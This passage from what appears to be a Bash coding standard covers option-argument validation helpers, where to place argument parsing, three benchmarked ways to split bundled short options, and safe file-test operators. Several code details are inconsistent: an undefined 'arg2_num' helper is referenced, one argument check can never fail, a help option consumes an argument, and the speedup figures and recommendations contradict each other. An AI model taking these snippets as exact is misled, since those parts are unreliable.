**3. `arg_num()` - Numeric Argument Validation**

Validates that an option's argument is a valid integer.

```bash
arg_num() { ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]] && die 2 "${1@Q} requires a numeric argument" ||:; }
```

**Usage:**
```bash
while (($#)); do case $1 in
  -d|--depth)
    arg_num "$@"   # Validate numeric
    shift
    MAX_DEPTH=$1   # Guaranteed to be integer
    ;;
  -C|--context)
    arg_num "$@"
    shift
    CONTEXT_LINES=$1
    ;;
esac; shift; done
```

**What it validates:**
- Argument exists (`${#@}-1<1`)
- Argument matches integer pattern (`^[0-9]+$`)
- Rejects: negative numbers, decimals, non-numeric text

**Type safety benefit:**
```bash
# Without validation:
-d|--depth) shift; MAX_DEPTH=$1 ;;
# User types: script --depth abc
# Result: MAX_DEPTH='abc' → errors in arithmetic later

# With validation:
-d|--depth) arg2_num "$@"; shift; MAX_DEPTH=$1 ;;
# User types: script --depth abc
# Result: Immediate clear error: '--depth requires a numeric argument'
```

### Complete Example with All Three

```bash
declare -i MAX_DEPTH=5 VERBOSE=0
declare -- OUTPUT_FILE=''
declare -a INPUT_FILES=()

# Validation helpers
arg2() { ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]] && die 2 "${1@Q} requires argument" ||:; }

arg_num() { ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]] && die 2 "${1@Q} requires a numeric argument" ||:; }

noarg() { (($# > 1)) && [[ ${2:0:1} != '-' ]] || die 2 "Missing argument for option ${1@Q}"; }

main() {
  while (($#)); do case $1 in
    -o|--output)
      arg2 "$@"                 # String validation
      shift
      OUTPUT_FILE=$1
      ;;

    -d|--depth)
      arg_num "$@"              # Numeric validation
      shift
      MAX_DEPTH=$1
      ;;

    -v|--verbose)
      VERBOSE=1                 # No argument needed
      ;;

    -h|--help)
      noarg "$@"                # Basic check (also valid)
      shift
      HELP_TOPIC=$1
      ;;

    -*)
      die 22 "Invalid option ${1@Q}"
      ;;

    *)
      INPUT_FILES+=("$1")       # Positional argument
      ;;
  esac; shift; done

  readonly -- OUTPUT_FILE MAX_DEPTH VERBOSE

  # ... rest of script
}

main "$@"
```

### Choosing the Right Validator

| Validator | Use Case | Example Options |
|-----------|----------|----------------|
| `noarg()` | Simple existence check | `-o FILE`, `-m MSG` |
| `arg2()` | String args, prevent `-` prefix | `--prefix PATH`, `--output FILE` |
| `arg_num()` | Numeric args requiring integers | `--depth NUM`, `--retries COUNT`, `-C NUM` |

### Anti-Patterns

```bash
# ✗ No validation - silent failure
-o|--output) shift; OUTPUT=$1 ;;
# Problem: --output --verbose → OUTPUT='--verbose'

# ✗ No validation - type error later
-d|--depth) shift; MAX_DEPTH=$1 ;;
# Problem: --depth abc → arithmetic errors: "abc: syntax error"

# ✗ Manual validation - verbose
-p|--prefix)
  if (($# < 2)); then
    die 2 "Option '-p' requires an argument"
  fi
  shift
  PREFIX=$1
  ;;
# Problem: Repetitive, verbose, inconsistent error messages

# ✓ Use helpers
-p|--prefix) arg2 "$@"; shift; PREFIX=$1 ;;
```

### Error Message Quality

**Note the `${1@Q}` pattern** used in `arg2()` and `arg2_num()`:

```bash
# User input: script '--some-weird$option' value
# With ${1@Q}: error: '--some-weird$option' requires argument
# Without:     error: --some-weird (crashes or expands $option)
```

See BCS04XX for detailed explanation of the `${parameter@Q}` shell quoting operator.

### Integration with Case Statements

These validators work seamlessly with the standard argument parsing pattern (BCS1001):

```bash
while (($#)); do case $1 in
  -d|--depth)     arg_num "$@"; shift; MAX_DEPTH=$1 ;;
  -v|--verbose)   VERBOSE=1 ;;
  -h|--help)      show_help; exit 0 ;;
  -[dvh]*)        set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
  -*)             die 22 "Invalid option ${1@Q}" ;;
  *)              FILES+=("$1") ;;
esac; shift; done
```

**Critical:** Always call validator BEFORE `shift` - validator needs to inspect `$2`.


---


**Rule: BCS0804**

## Argument Parsing Location

**Recommendation:** Place argument parsing inside the `main()` function rather than at the top level.

**Benefits:**
- Better testability (can test `main()` with different arguments)
- Cleaner variable scoping (parsing vars are local to `main()`)
- Encapsulation (argument handling is part of main execution flow)
- Easier to mock/test in unit tests

```bash
# Recommended: Parsing inside main()
main() {
  # Parse command-line arguments
  while (($#)); do
    case $1 in
      --builtin)    INSTALL_BUILTIN=1
                    BUILTIN_REQUESTED=1
                    ;;
      --no-builtin) SKIP_BUILTIN=1
                    ;;
      --prefix)     shift
                    PREFIX=$1
                    # Update derived paths
                    BIN_DIR="$PREFIX"/bin
                    LOADABLE_DIR="$PREFIX"/lib/bash/loadables
                    ;;
      -h|--help)    show_help
                    exit 0
                    ;;
      -*)           die 22 "Invalid option ${1@Q}"
                    ;;
      *)            >&2 show_help
                    die 2 "Unknown option ${1@Q}"
                    ;;
    esac
    shift
  done

  # Proceed with main logic
  check_prerequisites
  build_components
  install_components
}

main "$@"
#fin
```

**Alternative:** For very simple scripts (< 200 lines) without a `main()` function, top-level parsing is acceptable:

```bash
#!/bin/bash
set -euo pipefail

# Simple scripts can parse at top level
while (($#)); do case $1 in
  -v|--verbose) VERBOSE=1 ;;
  -h|--help)    show_help; exit 0 ;;
  -*)           die 22 "Invalid option ${1@Q}" ;;
  *)            FILES+=("$1") ;;
esac; shift; done

# Rest of simple script logic
```



---


**Rule: BCS0805**

# Short-Option Disaggregation in Command-Line Processing Loops

## Overview

Short-option disaggregation is the process of splitting bundled short options (e.g., `-abc`) into individual options (`-a -b -c`) for processing in command-line argument parsing loops. This allows users to write commands like `script -vvn` instead of `script -v -v -n`, following standard Unix conventions.

This document provides a comprehensive analysis of three methods for implementing short-option disaggregation in Bash scripts, including performance benchmarks, implementation details, and practical examples.

## Why Disaggregation is Needed

Unix/Linux command-line conventions allow users to bundle single-character options:

```bash
# These should be equivalent:
ls -lha
ls -l -h -a

# These should be equivalent:
script -vvn file.txt
script -v -v -n file.txt
```

Without disaggregation support, your script would treat `-lha` as a single unknown option rather than three separate options (`-l`, `-h`, `-a`). Disaggregation makes your script user-friendly and compliant with Unix conventions.

## The Three Methods

### Method 1: grep (Current Standard and Recommended)

**Approach:** Use `grep -o .` to split characters

```bash
case $1 in
  # ...
  -[amLpvqVh]*) #shellcheck disable=SC2046 #split up aggregated short options
    set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}"
    ;;
  # ...
esac
```

**How it works:**
1. `${1:1}` removes the leading dash from the option string
2. `grep -o .` outputs each character on a separate line
3. `printf -- "-%c "` adds a dash before each character
4. `set --` replaces the argument list with the expanded options
5. Leading empty string is added then removed to handle edge cases

**Pros:**
- Compact one-liner
- Standard approach used in most scripts
- Well-tested and reliable

**Cons:**
- Requires external `grep` command
- Slower performance (~190 iter/sec)
- Requires shellcheck disable for SC2046
- External process overhead

**Performance:** ~190 iterations/second

### Method 2: fold (Alternative)

**Approach:** Use `fold -w1` to split characters

```bash
case $1 in
  # ...
  -[amLpvqVh]*) #split up aggregated short options
    set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${1:1}")) "${@:2}"
    ;;
  # ...
esac
```

**How it works:**
1. `${1:1}` removes the leading dash
2. `fold -w1` wraps text at 1-character width (splits each char to its own line)
3. `printf -- "-%c "` adds a dash before each character
4. `set --` replaces the argument list

**Pros:**
- Slightly faster than grep (~3% improvement)
- More semantically correct (fold is designed for line wrapping)
- One-liner implementation

**Cons:**
- Still requires external command
- Still needs shellcheck disable
- Marginal performance improvement over grep
- External process overhead

**Performance:** ~195 iterations/second

### Method 3: Pure Bash

**Approach:** Use only bash built-ins for maximum performance

```bash
case $1 in
  # ...
  -[amLpvqVh]*) # Split up single options (pure bash)
    local -- opt=${1:1}
    local -a new_args=()
    while ((${#opt})); do
      new_args+=("-${opt:0:1}")
      opt=${opt:1}
    done
    set -- '' "${new_args[@]}" "${@:2}"
    ;;
  # ...
esac
```

**How it works:**
1. `opt=${1:1}` captures option string without leading dash
2. Initialize empty array `new_args=()`
3. Loop while option string has characters: `while ((${#opt}))`
4. Extract first character, prepend dash, append to array: `new_args+=("-${opt:0:1}")`
5. Remove first character from string: `opt=${opt:1}`
6. Replace argument list with expanded options

**Pros:**
- **68% faster** than grep/fold methods (~318 iter/sec)
- No external dependencies
- No shellcheck warnings needed
- More portable (works anywhere bash 4+ is available)
- No subprocess overhead

**Cons:**
- More verbose (6 lines vs 1 line)
- Slightly more complex logic

**Performance:** ~318 iterations/second

## Performance Comparison

**Benchmark Results (3-second test runs):**

| Method | Iterations | Iter/Sec | Relative Speed | External Deps | Shellcheck |
|--------|-----------|----------|----------------|---------------|------------|
| grep (current) | ~573 | 190.82 | Baseline | grep | SC2046 disable |
| fold | ~586 | 195.25 | +2.3% | fold | SC2046 disable |
| **Pure Bash** | **~954** | **317.75** | **+66.5%** | **None** | **Clean** |

**Key Finding:** Pure bash is approximately **68% faster** than external command methods, with no external dependencies and no shellcheck warnings.

## Complete Implementation Examples

### Example 1: Using grep (Current Standard)

```bash
#!/usr/bin/env bash
# My first script
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i DRY_RUN=0
declare -- output_file=''
declare -a files=()

# ============================================================================
# Utility Functions
# ============================================================================

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] FILE...

Process files with various options.

Options:
  -o, --output FILE  Output file (required)
  -n, --dry-run      Dry-run mode
  -v, --verbose      Verbose output (stackable)
  -V, --version      Show version
  -h, --help         Show this help

Examples:
  $SCRIPT_NAME -o output.txt file1.txt file2.txt
  $SCRIPT_NAME -vvno output.txt *.txt
EOF
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -o|--output)    noarg "$@"; shift; output_file=$1 ;;
    -n|--dry-run)   DRY_RUN=1 ;;

    -v|--verbose)   VERBOSE+=1 ;;
    -q|--quiet)     VERBOSE=0 ;;

    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support (grep method)
    -[onvqVh]*) #shellcheck disable=SC2046
                    set -- '' $(printf -- '-%c ' $(grep -o . <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option ${1@Q}" ;;
    *)              files+=("$1") ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE DRY_RUN output_file
  readonly -a files

  # Validate required arguments
  ((${#files[@]} > 0)) || die 2 'No input files specified'
  [[ -n "$output_file" ]] || die 2 'Output file required (use -o)'

  # Use parsed arguments
  ((VERBOSE)) && echo "Processing ${#files[@]} files" ||:
  ((DRY_RUN)) && echo "[DRY RUN] Would write to ${output_file@Q}" ||:

  # Process files
  local -- file
  for file in "${files[@]}"; do
    ((VERBOSE > 1)) && echo "Processing ${file@Q}"
    # Processing logic here
  done

  ((VERBOSE)) && echo "Results would be written to ${output_file@Q}" ||:
}

main "$@"
#fin
```

### Example 2: Using fold

```bash
#!/usr/bin/env bash
# My first script
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i FORCE=0
declare -- config_file=''

# ============================================================================
# Utility Functions
# ============================================================================

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 2 "Option ${1@Q} requires an argument"; }

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS]

Configuration manager.

Options:
  -c, --config FILE  Configuration file
  -v, --verbose      Verbose output
  -f, --force        Force operation
  -V, --version      Show version
  -h, --help         Show this help
EOF
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -c|--config)    (($#>0)) || die 22 "Option ${1@Q} requires argument"
                    shift
                    config_file=$1 ;;
    -f|--force)     FORCE=1 ;;

    -v|--verbose)   VERBOSE+=1 ;;
    -q|--quiet)     VERBOSE=0 ;;

    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support (fold method)
    -[cfvqVh]*) #shellcheck disable=SC2046
                    set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${1:1}")) "${@:2}" ;;
    -*)             die 22 "Invalid option ${1@Q}" ;;
    *)              die 2 "Unexpected argument ${1@Q}" ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE FORCE config_file

  # Validate required arguments
  [[ -n "$config_file" ]] || die 2 'Configuration file required (use -c)'

  ((VERBOSE)) && echo "Using config ${config_file@Q}" ||:
  ((FORCE)) && echo '[FORCE MODE] Ignoring safety checks' ||:

  # Main logic here
}

main "$@"
#fin
```

### Example 3: Using Pure Bash

```bash
#!/usr/bin/env bash
# My first script
set -euo pipefail
shopt -s inherit_errexit shift_verbose

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Default values
declare -i VERBOSE=0
declare -i PARALLEL=1
declare -- mode='normal'
declare -a targets=()

# ============================================================================
# Utility Functions
# ============================================================================

error() { >&2 echo "$SCRIPT_NAME: error: $*"; }
die() { (($# < 2)) || error "${@:2}"; exit "${1:-0}"; }

noarg() { (($# > 1)) || die 2 "Option '$1' requires an argument"; }

show_help() {
  cat <<EOF
Usage: $SCRIPT_NAME [OPTIONS] TARGET...

Process targets with configurable parallelism.

Options:
  -m, --mode MODE    Processing mode (normal|fast|safe)
  -j, --parallel N   Number of parallel jobs (default: 1)
  -v, --verbose      Verbose output (stackable)
  -q, --quiet        Quiet mode (suppress normal output)
  -V, --version      Show version
  -h, --help         Show this help

Examples:
  $SCRIPT_NAME -v target1 target2
  $SCRIPT_NAME -j4 -m fast target1 target2
  $SCRIPT_NAME -vvqj2 target1  # -q overrides -vv
EOF
}

# ============================================================================
# Main Function
# ============================================================================

main() {
  # Parse arguments
  while (($#)); do case $1 in
    -m|--mode)      noarg "$@"; shift
                    mode=$1 ;;
    -j|--parallel)  noarg "$@"; shift
                    PARALLEL=$1 ;;

    -v|--verbose)   VERBOSE+=1 ;;
    -q|--quiet)     VERBOSE=0 ;;

    -V|--version)   echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
    -h|--help)      show_help; exit 0 ;;

    # Short option bundling support (pure bash method)
    -[mjvqVh]*) # Split up single options (pure bash)
                    local -- opt=${1:1}
                    local -a new_args=()
                    while ((${#opt})); do
                      new_args+=("-${opt:0:1}")
                      opt=${opt:1}
                    done
                    set -- '' "${new_args[@]}" "${@:2}" ;;
    -*)             die 22 "Invalid option '$1'" ;;
    *)              targets+=("$1") ;;
  esac; shift; done

  # Make variables readonly after parsing
  readonly -- VERBOSE PARALLEL mode
  readonly -a targets

  # Validate arguments
  ((${#targets[@]} > 0)) || die 2 'No targets specified'
  [[ "$mode" =~ ^(normal|fast|safe)$ ]] || die 2 "Invalid mode: '$mode'"
  ((PARALLEL > 0)) || die 2 'Parallel jobs must be positive'

  # Use parsed arguments
  ((VERBOSE)) && {
    echo "Mode: $mode"
    echo "Parallel jobs: $PARALLEL"
    echo "Processing ${#targets[@]} targets"
  }

  # Process targets
  local -- target
  for target in "${targets[@]}"; do
    ((VERBOSE)) && echo "Processing '$target'"
    # Processing logic here
  done

  ((VERBOSE)) && echo "Complete"
}

main "$@"
#fin
```

## Usage Examples

All three methods support the same user-facing functionality:

```bash
# Single options
./script -v -v -n file.txt

# Bundled short options
./script -vvn file.txt

# Mixed bundled and separate
./script -vv -n file.txt

# Options with arguments cannot be bundled at the end
./script -vno output.txt file.txt  # -n -o output.txt

# Long options work normally
./script --verbose --verbose --dry-run file.txt

# Mixed long and short
./script -vv --dry-run -o output.txt file.txt
```

## Edge Cases and Considerations

### 1. Options Requiring Arguments

Options that take arguments cannot be in the middle of a bundle:

```bash
# ✓ Correct - option with argument at end or separate
./script -vno output.txt file.txt    # -v -n -o output.txt
./script -vn -o output.txt file.txt  # -v -n -o output.txt

# ✗ Wrong - option with argument in middle
./script -von output.txt file.txt    # Would try: -v -o -n output.txt
                                      # -o captures "n" as argument!
```

**Solution:** Document that options requiring arguments should be:
1. Placed at the end of a bundle
2. Used separately
3. Used with long-form (--output)

### 2. Character Set Validation

The pattern `-[amLpvqVh]*` explicitly lists valid options. This:
- Prevents incorrect disaggregation of unknown options
- Allows unknown options to be caught by the `-*)` case
- Documents which short options are valid

```bash
# Valid options explicitly listed
-[ovnVh]*)  # Only -o -v -n -V -h are valid short options

# If user provides invalid option
./script -xyz  # Doesn't match pattern, caught by -*) case
               # Error: Invalid option '-xyz'
```

### 3. Special Character Handling

Bash parameter expansion handles special characters correctly:

```bash
# These characters work correctly in pure bash method:
# Digits: -123 → -1 -2 -3
# Letters: -abc → -a -b -c
# Mixed: -v1n2 → -v -1 -n -2

# The grep/fold methods also handle these correctly
```

### 4. Empty String After Removal

All three methods use `set -- '' ...` followed by `shift` or explicit removal. This handles the edge case where no options are provided.

### 5. Performance Considerations

For scripts that:
- Process arguments frequently (loops, recursive calls)
- Need to start quickly (interactive tools)
- Run in resource-constrained environments

## Implementation Checklist

When implementing short-option disaggregation:

- [ ] List all valid short options in pattern: `-[ovnVh]*`
- [ ] Place disaggregation case before `-*)` invalid option case
- [ ] Ensure `shift` happens at end of loop for all cases
- [ ] Document which options can be bundled
- [ ] Warn users about options-with-arguments bundling limitations
- [ ] Add shellcheck disable comment for grep/fold methods
- [ ] Test with: single options, bundled options, mixed long/short
- [ ] Test with: options before/after positional arguments
- [ ] Verify stacking behavior for flags (e.g., `-vvv`)

## Performance Benchmark Script

The following script provides comprehensive performance testing of all three disaggregation methods:

```bash
#!/usr/bin/env bash
# Speed comparison test for option disaggregation methods
# Each test runs for at least 3 seconds
set -euo pipefail

error() { >&2 echo "$(basename -- "$0")" 'error:' "$*"; }

# Test input: 15 random alphanumeric characters
declare -- TEST_INPUT TEST_OUTPUT
TEST_INPUT="-$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c15 || true)"

# Generate expected output from TEST_INPUT
TEST_OUTPUT=()
declare -- opt="${TEST_INPUT:1}"
while ((${#opt})); do
  TEST_OUTPUT+=("-${opt:0:1}")
  opt="${opt:1}"
done

# Method 1: Original (grep)
method_grep() {
  local -- input=${1:1}
  shift
  set -- '' $(printf -- "-%c " $(grep -o . <<<"$input")) "$@"
  shift  # Remove leading empty string
}

# Method 2: fold -w1
method_fold() {
  local -- input=${1:1}
  shift
  set -- '' $(printf -- "-%c " $(fold -w1 <<<"$input")) "$@"
  shift  # Remove leading empty string
}

# Method 3: Pure bash
method_bash() {
  local -- input=$1
  local -- opt=${input:1}
  shift
  local -a new_args=()
  while ((${#opt})); do
    new_args+=("-${opt:0:1}")
    opt=${opt:1}
  done
  set -- "${new_args[@]}" "$@"
}

# Verification function using inline logic
verify_grep() {
  local -a result
  set -- '' $(printf -- '-%c ' $(grep -o . <<<"${TEST_INPUT:1}"))
  shift
  result=("$@")

  if [[ "${#result[@]}" -ne "${#TEST_OUTPUT[@]}" ]]; then
    error "grep produced ${#result[@]} args, expected ${#TEST_OUTPUT[@]}"
    return 1
  fi

  local -i i
  for ((i=0; i<${#TEST_OUTPUT[@]}; i+=1)); do
    if [[ "${result[$i]}" != "${TEST_OUTPUT[$i]}" ]]; then
      error "grep arg $i mismatch: '${result[$i]}' != '${TEST_OUTPUT[$i]}'"
      return 1
    fi
  done
  echo "✓ Original (grep) output verified"
}

verify_fold() {
  local -a result
  set -- '' $(printf -- '-%c ' $(fold -w1 <<<"${TEST_INPUT:1}"))
  shift
  result=("$@")

  if [[ "${#result[@]}" -ne "${#TEST_OUTPUT[@]}" ]]; then
    error "fold produced ${#result[@]} args, expected ${#TEST_OUTPUT[@]}"
    return 1
  fi

  local -i i
  for ((i=0; i<${#TEST_OUTPUT[@]}; i+=1)); do
    if [[ "${result[$i]}" != "${TEST_OUTPUT[$i]}" ]]; then
      error "fold arg $i mismatch: '${result[$i]}' != '${TEST_OUTPUT[$i]}'"
      return 1
    fi
  done
  echo "✓ Option 1 (fold) output verified"
}

verify_bash() {
  local -- opt=${TEST_INPUT:1}
  local -a result=()
  while ((${#opt})); do
    result+=("-${opt:0:1}")
    opt=${opt:1}
  done

  if [[ "${#result[@]}" -ne "${#TEST_OUTPUT[@]}" ]]; then
    error "pure bash produced ${#result[@]} args, expected ${#TEST_OUTPUT[@]}"
    return 1
  fi

  local -i i
  for ((i=0; i<${#TEST_OUTPUT[@]}; i+=1)); do
    if [[ "${result[$i]}" != "${TEST_OUTPUT[$i]}" ]]; then
      error "pure bash arg $i mismatch: '${result[$i]}' != '${TEST_OUTPUT[$i]}'"
      return 1
    fi
  done
  echo "✓ Option 3 (pure bash) output verified"
}

# Test runner function
run_test() {
  local -- method_name=$1
  local -- method_func=$2

  echo "Testing: $method_name"
  echo "----------------------------------------"

  # Calculate iterations needed
  local -i iterations=0
  local -- current_time='' elapsed=''
  local -- start_time="${EPOCHREALTIME}"

  # Warm-up and calibration run
  while ((1)); do
    $method_func "$TEST_INPUT" arg1 arg2 arg3 >/dev/null 2>&1
    iterations+=1

    current_time="${EPOCHREALTIME}"
    elapsed=$(awk "BEGIN {print $current_time - $start_time}")

    # Check if we've exceeded 3 seconds
    if (( $(awk "BEGIN {print ($elapsed >= 3.0)}") )); then
      break
    fi
  done

  echo "Iterations: $iterations"
  echo "Elapsed time: ${elapsed}s"
  echo "Iterations/sec: $(awk "BEGIN {printf \"%.2f\", $iterations / $elapsed}")"
  echo ""
}

# Main test execution
echo "========================================"
echo "Option Disaggregation Speed Test"
echo "========================================"
echo "Test input: $TEST_INPUT (${#TEST_INPUT} chars, $((${#TEST_INPUT} - 1)) options)"
echo "Minimum test duration: 3.0000 seconds"
echo ""

# Source timer for use
source timer 2>/dev/null || {
  error 'timer not found or cannot be sourced'
  exit 1
}

# Verify all methods produce correct output
echo "Verifying method correctness..."
echo "Expected output: ${TEST_OUTPUT[*]}"
echo
verify_grep || exit 1
verify_fold || exit 1
verify_bash || exit 1
echo

# Run tests
timer -f bash -c "$(declare -f method_grep run_test); run_test 'Original (grep)' method_grep"
timer -f bash -c "$(declare -f method_fold run_test); run_test 'Option 1 (fold)' method_fold"
timer -f bash -c "$(declare -f method_bash run_test); run_test 'Option 3 (pure bash)' method_bash"

echo "========================================"
echo "Test complete"
echo "========================================"

#fin
```

### Running the Benchmark

```bash
# Save as speedtest.sh and make executable
chmod +x speedtest.sh

# Run the benchmark
./speedtest.sh
```

### Sample Output

```
========================================
Option Disaggregation Speed Test
========================================
Test input: -sJD2Vle76LlfR2J (16 chars, 15 options)
Minimum test duration: 3.0000 seconds

Verifying method correctness...
Expected output: -s -J -D -2 -V -l -e -7 -6 -L -l -f -R -2 -J

✓ Original (grep) output verified
✓ Option 1 (fold) output verified
✓ Option 3 (pure bash) output verified

Testing: Original (grep)
----------------------------------------
Iterations: 573
Elapsed time: 3.00276s
Iterations/sec: 190.82

Testing: Option 1 (fold)
----------------------------------------
Iterations: 586
Elapsed time: 3.00123s
Iterations/sec: 195.25

Testing: Option 3 (pure bash)
----------------------------------------
Iterations: 954
Elapsed time: 3.00239s
Iterations/sec: 317.75

========================================
Test complete
========================================
```

## Recommendations

### Recommendation

**Keep Current Method (grep) Unless:**
1. Performance is critical
2. Script is called frequently
3. External dependencies are a concern
4. Running in restricted environment

### For High-Performance Scripts

**Always Use Pure Bash Method**

Scripts that should prioritize performance:
- Called in tight loops
- Part of build systems
- Interactive tools (tab completion, prompts)
- Running in containers/restricted environments
- Called thousands of times per session

## Testing Your Implementation

### Basic Functionality Test

```bash
# Test single options
./script -v -v -n file.txt

# Test bundled options
./script -vvn file.txt

# Test mixed
./script -v --verbose -n file.txt

# Test with arguments
./script -vno output.txt file.txt

# Test invalid options
./script -xyz  # Should error

# Test option stacking
./script -vvvvv  # VERBOSE should be 5
```

### Automated Test Suite

```bash
#!/usr/bin/env bash
# test-option-bundling.sh

test_bundling() {
  local -- description=$1
  shift
  echo "Testing: $description"

  # Run your script with provided arguments
  output=$(./your-script "$@" 2>&1)

  # Verify output matches expectations
  # Add your verification logic here

  echo "  ✓ Passed"
}

# Test cases
test_bundling "Single options" -v -v -n file.txt
test_bundling "Bundled options" -vvn file.txt
test_bundling "Mixed long/short" -v --verbose -n file.txt
test_bundling "Options with args" -vno output.txt file.txt

echo "All tests passed!"
```

## Conclusion

Short-option disaggregation is essential for creating user-friendly command-line tools that follow Unix conventions. While all three methods produce identical results, the pure bash method offers significant performance advantages with no external dependencies.

**Summary:**
- **grep method:** Recommended, Current standard, external dependency, ~190 iter/sec
- **fold method:** Marginal improvement, external dependency, ~195 iter/sec
- **Pure bash:** No dependencies, ~318 iter/sec (68% faster)



---


**Rule: BCS0900**

# File Operations

This section establishes safe file handling practices to prevent common pitfalls in shell scripting. It covers proper file testing operators (`-e`, `-f`, `-d`, `-r`, `-w`, `-x`) with explicit quoting requirements, safe wildcard expansion patterns that always use explicit paths (`rm ./*` never `rm *`), process substitution techniques (`< <(command)`) for avoiding subshell variable issues when reading command output, and here document patterns for multi-line input. These defensive programming practices prevent accidental file deletion, handle special characters safely, and ensure reliable file operations across different environments.


---


**Rule: BCS0901**

## Safe File Testing

**Always quote variables and use `[[ ]]` for file tests:**

```bash
# Basic file testing
[[ -f "$file" ]] && source "$file"
[[ -d "$path" ]] || die 1 "Not a directory ${path@Q}"
[[ -r "$file" ]] || warn "Cannot read ${file@Q}"
[[ -x "$script" ]] || die 1 "Not executable ${script@Q}"

# Check multiple conditions
if [[ -f "$config" && -r "$config" ]]; then
  source "$config"
else
  die 3 "Config file not found or not readable ${config@Q}"
fi

# Check file emptiness
[[ -s "$logfile" ]] || warn 'Log file is empty'

# Compare file timestamps
if [[ "$source" -nt "$destination" ]]; then
  cp "$source" "$destination"
  info "Updated $destination"
fi
```

**Complete file test operators:**

| Operator | Returns True If |
|----------|----------------|
| `-e file` | File exists (any type) |
| `-f file` | Regular file exists |
| `-d dir` | Directory exists |
| `-L link` | Symbolic link exists |
| `-p pipe` | Named pipe (FIFO) exists |
| `-S sock` | Socket exists |
| `-b file` | Block device exists |
| `-c file` | Character device exists |

**Permission and attribute tests:**

| Operator | Returns True If |
|----------|----------------|
| `-r file` | File is readable |
| `-w file` | File is writable |
| `-x file` | File is executable |
| `-s file` | File is not empty (size > 0) |
| `-u file` | File has SUID bit set |
| `-g file` | File has SGID bit set |
| `-k file` | File has sticky bit set |
| `-O file` | You own the file |
| `-G file` | File's group matches yours |
| `-N file` | File modified since last read |

**File comparison operators:**

| Operator | Returns True If |
|----------|----------------|
| `file1 -nt file2` | file1 is newer than file2 (modification time) |
| `file1 -ot file2` | file1 is older than file2 |
| `file1 -ef file2` | file1 and file2 have same device and inode (same file) |

**Rationale:**

- **Always quote**: `"$file"` prevents word splitting and glob expansion
- **Use `[[ ]]`**: More robust than `[ ]` or `test` command
- **Test before use**: Prevents errors from missing/unreadable files
- **Fail fast**: Use `|| die` to exit immediately if prerequisites not met
- **Informative messages**: Include filename in error messages for debugging

**Common patterns:**

```bash
# Validate required file exists and is readable
validate_file() {
  local file=$1
  [[ -f "$file" ]] || die 2 "File not found ${file@Q}"
  [[ -r "$file" ]] || die 5 "Cannot read file ${file@Q}"
}

# Check if directory is writable
ensure_writable_dir() {
  local dir=$1
  [[ -d "$dir" ]] || mkdir -p "$dir" || die 1 "Cannot create directory ${dir@Q}"
  [[ -w "$dir" ]] || die 5 "Directory not writable ${dir@Q}"
}

# Only process if file was modified
process_if_modified() {
  local source=$1
  local marker=$2

  if [[ ! -f "$marker" ]] || [[ "$source" -nt "$marker" ]]; then
    process_file "$source"
    touch "$marker"
  else
    info "File ${source@Q} not modified, skipping"
  fi
}

# Check if file is executable script
is_executable_script() {
  local file=$1
  [[ -f "$file" && -x "$file" && -s "$file" ]]
}

# Safe file sourcing
safe_source() {
  local file=$1
  if [[ -f "$file" ]]; then
    if [[ -r "$file" ]]; then
      source "$file"
    else
      warn "Cannot read file ${file@Q}"
      return 1
    fi
  else
    debug "File not found ${file@Q} (optional)"
    return 0
  fi
}
```

**Anti-patterns to avoid:**

```bash
# ✗ Wrong - unquoted variable
[[ -f $file ]]  # Breaks with spaces or special chars

# ✓ Correct - always quote
[[ -f "$file" ]]

# ✗ Wrong - using old [ ] syntax
if [ -f "$file" ]; then
  cat "$file"
fi

# ✓ Correct - use [[ ]]
if [[ -f "$file" ]]; then
  cat "$file"
fi

# ✗ Wrong - not checking before use
source "$config"  # Error if file doesn't exist

# ✓ Correct - validate first
[[ -f "$config" ]] || die 3 "Config not found ${config@Q}"
[[ -r "$config" ]] || die 5 "Cannot read config: ${config@Q}"
source "$config"

# ✗ Wrong - silent failure
[[ -d "$dir" ]] || mkdir "$dir"  # mkdir failure not caught

# ✓ Correct - check result
[[ -d "$dir" ]] || mkdir "$dir" || die 1 "Cannot create directory: ${dir@Q}"
```

**Combining file tests:**

```bash
# Multiple conditions with AND
